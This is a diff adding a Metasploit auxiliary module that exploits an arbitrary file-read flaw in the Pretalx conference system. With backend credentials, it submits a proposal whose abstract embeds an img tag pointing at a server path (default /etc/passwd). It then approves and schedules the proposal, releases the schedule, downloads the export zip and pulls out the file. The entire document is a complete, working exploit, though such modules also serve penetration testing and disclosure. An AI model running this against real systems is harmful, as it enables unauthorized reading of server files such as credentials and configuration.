@@ -1,0 +1,458 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'zip'
+
+class MetasploitModule < Msf::Auxiliary
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Report
+  include Msf::Auxiliary::Scanner
+  prepend Msf::Exploit::Remote::AutoCheck
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Pretalx File Read',
+        'Description' => 'This module exploits functionality in Pretalx that export conference schedule as zipped file. The Pretalx will iteratively include any file referenced by any HTML tag and does not properly check the path of the file, which can lead to arbitrary file read. The module requires crendetials that allow schedule export, schedule release and approval of proposals. Additionaly, module requires conference name and URL for media files.',
+        'Author' => [
+          'Stefan Schiller', # security researcher
+          'msutovsky-r7' # module dev
+        ],
+        'License' => MSF_LICENSE,
+
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [REPEATABLE_SESSION],
+          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
+        }
+      )
+    )
+    register_options([
+      OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
+      OptString.new('MEDIA_URL', [true, 'Prepend path to file path that allows arbitrary read', '/media']),
+      OptString.new('USERNAME', [true, 'Username to Pretalx backend', '']),
+      OptString.new('PASSWORD', [true, 'Password to Pretalx backend', '']),
+      OptString.new('CONFERENCE_NAME', [true, 'Name of conference on behalf which file read will be performed', ''])
+    ])
+  end
+
+  def login
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri('orga', 'login/'),
+      'keep_cookies' => true
+    })
+
+    fail_with Failure::NotVulnerable, 'Application might not be Pretalx' unless res&.code == 200
+
+    csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
+
+    fail_with Failure::UnexpectedReply, 'Could not find CSRF token' unless csrf_token
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri('orga', 'login/'),
+      'vars_post' => { 'csrfmiddlewaretoken' => csrf_token, 'login_email' => datastore['USERNAME'], 'login_password' => datastore['PASSWORD'] },
+      'keep_cookies' => true
+    })
+
+    fail_with Failure::UnexpectedReply unless res.get_cookies =~ /pretalx_csrftoken=([a-zA-Z0-9]+);/
+
+    @pretalx_token = Regexp.last_match(1)
+
+    return false unless res&.code == 302
+
+    true
+  end
+
+  def register_malicious_speaker
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(datastore['CONFERENCE_NAME'], 'submit/')
+    })
+
+    fail_with Failure::UnexpectedReply unless res&.code == 302
+    submit_uri = res.headers.fetch('Location', nil)
+
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(submit_uri),
+      'keep_cookies' => true
+    })
+
+    fail_with Failure::UnexpectedReply unless res&.code == 200
+
+    csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
+    submission_type = res.get_hidden_inputs.dig(0, 'submission_type')
+    res.get_hidden_inputs.dig(0, 'content_locale')
+
+    fail_with Failure::Unknown unless submit_uri && csrf_token
+
+    @proposal_name = Rex::Text.rand_text_alphanumeric(10)
+
+    boundary = Rex::Text.rand_text_alphanumeric(16).to_s
+    data_post = "------WebKitFormBoundary#{boundary}\r\n"
+
+    data_post << "Content-Disposition: form-data; name=\"csrfmiddlewaretoken\"\r\n\r\n"
+    data_post << "#{csrf_token}\r\n"
+    data_post << "------WebKitFormBoundary#{boundary}\r\n"
+
+    data_post << "Content-Disposition: form-data; name=\"title\"\r\n\r\n"
+    data_post << "#{@proposal_name}\r\n"
+    data_post << "------WebKitFormBoundary#{boundary}\r\n"
+
+    data_post << "Content-Disposition: form-data; name=\"submission_type\"\r\n\r\n"
+    data_post << "#{submission_type}\r\n"
+    data_post << "------WebKitFormBoundary#{boundary}\r\n"
+
+    data_post << "Content-Disposition: form-data; name=\"content_locale\"\r\n\r\n"
+    data_post << "en\r\n"
+    data_post << "------WebKitFormBoundary#{boundary}\r\n"
+
+    data_post << "Content-Disposition: form-data; name=\"abstract\"\r\n\r\n"
+    data_post << %(<img src="#{datastore['MEDIA_URL']}//#{datastore['FILEPATH']}"/>\r\n)
+    data_post << "------WebKitFormBoundary#{boundary}\r\n"
+
+    data_post << "Content-Disposition: form-data; name=\"description\"\r\n\r\n"
+    data_post << "\r\n"
+    data_post << "------WebKitFormBoundary#{boundary}\r\n"
+
+    data_post << "Content-Disposition: form-data; name=\"notes\"\r\n\r\n"
+    data_post << "\r\n"
+    data_post << "------WebKitFormBoundary#{boundary}\r\n"
+
+    data_post << "Content-Disposition: form-data; name=\"image\";filename=\"\"\r\n"
+    data_post << "Content-Type: application/octet-stream\r\n\r\n"
+    data_post << "\r\n"
+    data_post << "------WebKitFormBoundary#{boundary}\r\n"
+
+    data_post << "Content-Disposition: form-data; name=\"additional_speaker\"\r\n\r\n"
+    data_post << "\r\n"
+    data_post << "------WebKitFormBoundary#{boundary}\r\n"
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(submit_uri),
+      'data' => data_post,
+      'ctype' => "multipart/form-data; boundary=----WebKitFormBoundary#{boundary}"
+    })
+
+    #===============================================================================
+
+    fail_with Failure::UnexpectedReply unless res&.code == 302
+
+    submit_uri = res.headers.fetch('Location', nil)
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(submit_uri),
+      'keep_cookies' => true
+    })
+
+    fail_with Failure::UnexpectedReply unless res&.code == 200
+
+    csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
+
+    fail_with Failure::Unknown unless submit_uri && csrf_token
+
+    boundary = Rex::Text.rand_text_alphanumeric(16).to_s
+
+    data_post = "------WebKitFormBoundary#{boundary}\r\n"
+    data_post << "Content-Disposition: form-data; name=\"csrfmiddlewaretoken\"\r\n\r\n"
+    data_post << "#{csrf_token}\r\n"
+    data_post << "------WebKitFormBoundary#{boundary}\r\n"
+    data_post << "Content-Disposition: form-data; name=\"csrfmiddlewaretoken\"\r\n\r\n"
+    data_post << "#{csrf_token}\r\n"
+    data_post << "------WebKitFormBoundary#{boundary}\r\n"
+
+    data_post << "Content-Disposition: form-data; name=\"login_email\"\r\n\r\n"
+    data_post << "#{datastore['USERNAME']}\r\n"
+    data_post << "------WebKitFormBoundary#{boundary}\r\n"
+
+    data_post << "Content-Disposition: form-data; name=\"login_password\"\r\n\r\n"
+    data_post << "#{datastore['PASSWORD']}\r\n"
+    data_post << "------WebKitFormBoundary#{boundary}\r\n"
+
+    data_post << "Content-Disposition: form-data; name=\"register_name\"\r\n\r\n"
+    data_post << "\r\n"
+    data_post << "------WebKitFormBoundary#{boundary}\r\n"
+
+    data_post << "Content-Disposition: form-data; name=\"register_email\"\r\n\r\n"
+    data_post << "\r\n"
+    data_post << "------WebKitFormBoundary#{boundary}\r\n"
+
+    data_post << "Content-Disposition: form-data; name=\"register_password\"\r\n\r\n"
+    data_post << "\r\n"
+    data_post << "------WebKitFormBoundary#{boundary}\r\n"
+
+    data_post << "Content-Disposition: form-data; name=\"register_password_repeat\"\r\n\r\n"
+    data_post << "\r\n"
+    data_post << "------WebKitFormBoundary#{boundary}\r\n"
+    #================================================================================
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(submit_uri),
+      'data' => data_post,
+      'ctype' => "multipart/form-data; boundary=----WebKitFormBoundary#{boundary}"
+    })
+
+    fail_with Failure::UnexpectedReply unless res&.code == 302
+
+    submit_uri = res.headers.fetch('Location', nil)
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(submit_uri),
+      'keep_cookies' => true
+    })
+
+    fail_with Failure::UnexpectedReply unless res&.code == 200
+
+    csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
+
+    fail_with Failure::Unknown unless submit_uri && csrf_token
+
+    boundary = Rex::Text.rand_text_alphanumeric(16).to_s
+
+    data_post = "------WebKitFormBoundary#{boundary}\r\n"
+    data_post << "Content-Disposition: form-data; name=\"csrfmiddlewaretoken\"\r\n\r\n"
+    data_post << "#{csrf_token}\r\n"
+    data_post << "------WebKitFormBoundary#{boundary}\r\n"
+
+    data_post << "Content-Disposition: form-data; name=\"avatar\";filename=\"\"\r\n"
+    data_post << "Content-Type: application/octet-stream\r\n\r\n"
+    data_post << "\r\n"
+    data_post << "------WebKitFormBoundary#{boundary}\r\n"
+
+    data_post << "Content-Disposition: form-data; name=\"name\"\r\n\r\n"
+    data_post << "#{Rex::Text.rand_text_alphanumeric(10)}\r\n"
+    data_post << "------WebKitFormBoundary#{boundary}\r\n"
+
+    data_post << "Content-Disposition: form-data; name=\"biography\"\r\n\r\n"
+    data_post << "#{Rex::Text.rand_text_alphanumeric(10)}\r\n"
+    data_post << "------WebKitFormBoundary#{boundary}\r\n"
+
+    data_post << "Content-Disposition: form-data; name=\"availabilities\"\r\n\r\n"
+    data_post << %({"availabilities":[]}\r\n)
+    data_post << "------WebKitFormBoundary#{boundary}\r\n"
+
+    #=============================================================================
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(submit_uri),
+      'data' => data_post,
+      'ctype' => "multipart/form-data; boundary=----WebKitFormBoundary#{boundary}"
+    })
+
+    fail_with Failure::UnexpectedReply unless res&.code == 302
+  end
+
+  def approve_proposal
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'submissions/')
+    })
+
+    fail_with Failure::UnexpectedReply unless res&.code == 200
+
+    html = res.get_html_document
+
+    proposal_element = html.xpath('//td/a').find { |link| link.text.strip == @proposal_name }
+
+    proposal_uri = proposal_element['href']
+
+    fail_with Failure::PayloadFailed unless proposal_uri =~ %r{/orga/event/#{datastore['CONFERENCE_NAME']}/submissions/([a-zA-Z0-9]+)/}
+
+    proposal_id = Regexp.last_match(1)
+
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(proposal_uri)
+    })
+
+    fail_with Failure::UnexpectedReply unless res&.code == 200
+
+    html = res.get_html_document
+
+    approval_link = html.at('a[@class="dropdown-item submission-state-accepted"]')
+
+    approval_uri = approval_link['href']
+
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(approval_uri)
+    })
+
+    fail_with Failure::UnexpectedReply unless res&.code == 200
+
+    next_token = res.get_hidden_inputs.dig(0, 'next')
+    csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
+
+    send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(approval_uri),
+      'vars_post' => { 'csrfmiddlewaretoken' => csrf_token, 'next' => next_token }
+    })
+
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(datastore['CONFERENCE_NAME'], 'me', 'submissions', proposal_id, 'confirm')
+    })
+
+    fail_with Failure::UnexpectedReply unless res&.code == 200
+
+    csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
+
+    send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(datastore['CONFERENCE_NAME'], 'me', 'submissions', proposal_id, 'confirm'),
+      'vars_post' => { 'csrfmiddlewaretoken' => csrf_token }
+    })
+  end
+
+  def add_proposal_to_schedule
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'schedule', 'api', 'talks/')
+    })
+
+    fail_with Failure::UnexpectedReply unless res&.code == 200
+
+    json_data = res.get_json_document
+
+    proposal = json_data['results'].find { |l| l['title'] == @proposal_name }
+
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri('api', 'events', datastore['CONFERENCE_NAME'], 'rooms/')
+    })
+
+    fail_with Failure::UnexpectedReply unless res&.code == 200
+    rooms_json = res.get_json_document
+    rooms_json['results'].each do |value|
+      res = send_request_cgi!({
+        'method' => 'GET',
+        'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'schedule', 'api', 'availabilities', proposal['id'], value['id'])
+      })
+      next unless res&.code == 200
+
+      availability_json = res.get_json_document
+
+      availability_json['results'].each do |timeslot|
+        schedule_slot = { 'room' => (value['id']).to_s, 'start' => timeslot['start'], 'duration' => 30, 'description' => '' }
+
+        res = send_request_cgi({
+          'method' => 'PATCH',
+          'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'schedule', 'api', 'talks', "#{proposal['id']}/"),
+          'data' => JSON.generate(schedule_slot),
+          'headers' => { 'X-CSRFToken' => @pretalx_token }
+        })
+        return true if res&.code == 200
+      end
+    end
+    false
+  end
+
+  def check_host(_ip)
+    return Exploit::CheckCode::Unknown, 'Login failed, please check credentials' unless login
+
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri('orga', 'event/'),
+      'keep_cookies' => true
+    })
+
+    return Exploit::CheckCode::Detected unless res&.code == 200
+
+    html = res.get_html_document
+
+    version_element = Rex::Version.new(html.at('span//a')&.text)
+
+    return Exploit::CheckCode::Appears("Detected vulnerable version #{version_element}") if version_element <= Rex::Version.new('2.3.1')
+
+    Exploit::CheckCode::Safe("Detected version #{version_element} is not vulnerable")
+  end
+
+  def release_schedule
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'schedule', 'release')
+    })
+
+    csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
+    html = res.get_html_document
+    version = html.at('input[@id="id_version"]')['value']
+
+    send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'schedule', 'release'),
+      'vars_post' => { 'csrfmiddlewaretoken' => csrf_token, 'version' => version, 'comment_0' => '', 'notify_speakers' => 'off' }
+    })
+  end
+
+  def download_zip
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'schedule', 'export/')
+    })
+
+    fail_with Failure::UnexpectedReply unless res&.code == 200
+
+    csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
+
+    res = send_request_cgi!({
+      'method' => 'POST',
+      'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'schedule', 'export', 'trigger'),
+      'vars_post' => { 'csrfmiddlewaretoken' => csrf_token }
+    })
+
+    fail_with Failure::UnexpectedReply unless res&.code == 200
+
+    res = send_request_cgi!({
+      'method' => 'GET',
+      'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'schedule', 'export', 'download')
+    })
+
+    zip = Zip::File.open_buffer(res.body)
+    zip.find_entry("#{datastore['CONFERENCE_NAME']}#{datastore['MEDIA_URL']}#{datastore['FILEPATH']}")
+    # TODO: add check
+    return zip.read(zip.find_entry("#{datastore['CONFERENCE_NAME']}#{datastore['MEDIA_URL']}#{datastore['FILEPATH']}"))
+  end
+
+  def run_host(ip)
+    register_malicious_speaker
+
+    cookie_jar.clear
+
+    fail_with Failure::NoAccess, 'Incorrect credentials' unless login
+
+    approve_proposal
+
+    add_proposal_to_schedule
+
+    release_schedule
+    extracted_content = download_zip
+
+    loot_path = store_loot(
+      "pretalx.#{datastore['FILEPATH']}",
+      'text/plain',
+      ip,
+      extracted_content,
+      "pretalx-#{datastore['FILEPATH']}.txt",
+      'Pretalx'
+    )
+    print_status "Stored results in #{loot_path}"
+    report_vuln({
+      host: rhost,
+      port: rport,
+      name: name,
+      refs: references,
+      info: "Module #{fullname} successfully leaked file"
+    })
+  end
+
+end
